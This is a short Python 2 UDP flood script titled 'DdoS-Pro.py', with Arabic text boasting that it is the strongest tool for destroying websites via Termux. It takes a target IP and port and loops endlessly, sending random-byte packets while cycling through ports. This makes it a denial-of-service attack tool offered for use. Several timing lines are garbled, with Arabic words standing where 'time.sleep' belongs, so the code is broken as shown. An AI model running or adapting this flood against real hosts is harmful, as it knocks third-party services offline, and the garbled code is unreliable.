print ("\033[90m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DdoS-Pro.py")
print
print "Coded By : Mr.BL4Z3"
print "المطور   : المــــطور  الـــكـنج حــمـودي الاسطـورة"
print "اقوي اده تدمير مواقع عبر الترمكس تم تطويره وصنعه من قبل الكنج حمودي الاسطوره🇾🇪 "
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[91m")
os.system("figlet DdoS Attack")
print("Team : المــــطور  الـــكـنج حــمـودي الاسطـورة")
print ("\033[92m")
print "[                    ] 0% "
time.جارئ التحميل (5)
print "[=====               ] 25%"
time.جارئ التحميل (5)
print "[==========          ] 50%"
time.جارئ التحميل (5)
print "[===============     ] 75%"
time.جارئ التحميل (5)
print "[====================] 100%"
time.جارئ التحميل (3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 8080:
       port = 1

